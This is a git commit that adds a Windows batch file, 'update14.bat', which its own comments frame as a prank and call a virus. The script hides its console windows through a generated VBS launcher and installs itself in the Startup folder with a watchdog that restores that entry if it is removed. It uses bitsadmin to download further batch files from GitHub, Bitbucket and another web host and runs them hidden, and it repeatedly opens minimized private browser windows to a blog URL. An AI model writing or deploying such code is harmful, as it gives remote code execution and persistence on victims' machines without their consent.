694d76e7167a11937c69cd9bfd658b7bbaf39603
AndroidPrior <48363233+AndroidPrior@users.noreply.github.com>
2019-03-13 20:25:48 -0400

    Add files via upload

---
+++ update14.bat
@@ -0,0 +1,249 @@
+@echo off
+
+REM Use this for educational purposes only.
+REM I do not any take responsability for you pranking your friends or getting in trouble.
+REM If you accidentally downloaded this or ran this, you can download the remover.bat from the gihub page. 
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+
+
+If EXIST C:\Users\%username%\AppData\Local\startup_copier.bat (
+	del "C:\Users\%username%\AppData\Local\startup_copier.bat"
+) ELSE (
+	ECHO
+)
+
+If EXIST C:\Users\%username%\AppData\Local\startup_copier2.bat (
+	del "C:\Users\%username%\AppData\Local\startup_copier2.bat"
+) ELSE (
+	ECHO
+)
+
+If EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
+) ELSE (
+	ECHO 
+)
+
+If EXIST C:\Users\%username%\AppData\Local\msdfmap.bat (
+	del "C:\Users\%username%\AppData\Local\msdfmap.bat"
+) ELSE (
+	ECHO 
+)
+
+
+If EXIST C:\Users\%username%\AppData\Local\msdfmap.vbs (
+	del "C:\Users\%username%\AppData\Local\msdfmap.vbs"
+) ELSE (
+	ECHO 
+)
+
+
+If EXIST C:\Users\%username%\AppData\Local\mute.vbs (
+	del "C:\Users\%username%\AppData\Local\mute.vbs"
+) ELSE (
+	ECHO 
+)
+
+
+
+If EXIST C:\Users\%username%\AppData\Local\update0.bat (
+	del "C:\Users\%username%\AppData\Local\update0.bat"
+) ELSE (
+	ECHO 
+)
+
+
+If EXIST C:\Users\%username%\AppData\Local\startup.bat (
+	del "C:\Users\%username%\AppData\Local\startup.bat"
+) ELSE (
+	ECHO 
+)
+
+
+
+If EXIST C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat (
+	del "C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat"
+) ELSE (
+	ECHO 
+)
+
+
+
+
+
+	
+REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
+type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
+set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
+ECHO %pwd% >> C:\Users\%username%\Downloads\msdfmap.vbs
+
+
+
+REM This creates the mute.vbs script.
+set mute1=Set WshShell = CreateObject("WScript.Shell")
+set mute2=	For i = 0 To 50
+set mute3=	WshShell.SendKeys(chr(174))
+set mute4=  WScript.Sleep 100
+set mute5=Next
+type NUL > C:\Users\%username%\Downloads\mute.vbs
+ECHO %mute1%  >> C:\Users\%username%\Downloads\mute.vbs
+ECHO %mute2%  >> C:\Users\%username%\Downloads\mute.vbs
+ECHO %mute3%  >> C:\Users\%username%\Downloads\mute.vbs
+ECHO %mute4%  >> C:\Users\%username%\Downloads\mute.vbs
+ECHO %mute5%  >> C:\Users\%username%\Downloads\mute.vbs
+
+
+
+
+type NUL > C:\Users\%username%\Downloads\startup.bat
+ECHO @echo off >> C:\Users\%username%\Downloads\startup.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\msdfmap.bat >> C:\Users\%username%\Downloads\startup.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier2.bat >> C:\Users\%username%\Downloads\startup.bat
+
+
+type NUL > C:\Users\%username%\Downloads\startup_copier2.bat
+ECHO @echo off >> C:\Users\%username%\Downloads\startup_copier2.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier.bat >> C:\Users\%username%\Downloads\startup_copier2.bat
+
+
+type NUL > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO :loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ECHO hello >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ELSE( >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\Appdata\Local\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) >> C:\Users\%username%\Downloads\startup_copier.bat
+ECHO goto loop22 >> C:\Users\%username%\Downloads\startup_copier.bat
+
+
+
+
+
+
+REM This builds the code for msdfmap.bat
+REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
+type NUL > C:\Users\%username%\Downloads\msdfmap.bat
+ECHO @echo off >> C:\Users\%username%\Downloads\msdfmap.bat
+
+ECHO ping -n 1 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
+REM Download Set_IE_AS_DEFAULT_BROWSER.bat
+ECHO IF EXIST "C:\Users\%username%\Appdata\Local\set_IE_as_default_browser.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/Set_IE_as_default_browser.bat" "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO 	 copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     del C:\Users\%username%\Downloads\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO IF EXIST "C:\Users\%username%\Appdata\Local\set_IE_as_default_browser.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/Set_IE_as_default_browser.bat" "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO 	 copy /y "C:\Users\%username%\Downloads\set_IE_as_default_browser.bat" "C:\Users\%username%\AppData\Local" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     del C:\Users\%username%\Downloads\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
+REM Wait 17 mins, then launch internet. 
+ECHO :loop >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\set_IE_as_default_browser.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO start /min iexplore.exe -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
+
+ECHO ping -n 60 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
+ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ping -n 86400 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
+
+
+
+
+REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
+ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO 	echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO 	bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO )	 >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
+
+
+REM if the update is downloaded its copied somewhere where this can check it update1 has been installed. May not be necessary.
+ECHO ping -n 2 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO IF EXIST "C:\Users\Popeye\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO    wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\Downloads\update1.bat >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ECHO nothing >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
+
+ECHO goto loop >> C:\Users\%username%\Downloads\msdfmap.bat
+
+
+
+
+REM This code copies each of the created files to specific folders. 
+
+copy /y "C:\Users\%username%\Downloads\msdfmap.bat" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+
+REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
+del C:\Users\%username%\Downloads\startup.bat
+del C:\Users\%username%\Downloads\msdfmap.bat
+del C:\Users\%username%\Downloads\msdfmap.vbs
+del C:\Users\%username%\Downloads\mute.vbs
+del C:\Users\%username%\Downloads\startup_copier.bat
+del C:\Users\%username%\Downloads\startup_copier2.bat
+
+
+
+wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier2.bat
+ping -n 3 127.0.0.1 > nul
+wscript.exe C:\Users\%username%\AppData\Local\msdfmap.vbs C:\Users\%username%\AppData\Local\msdfmap.bat
+
+
+
+REM del THIS_FILES_NAME.bat
+del update12.bat
+
+
+
+
+REM Taskkill cmd.exe used at somepoint after the update. regular virus will auto run after next computer restart. This is only for updating.
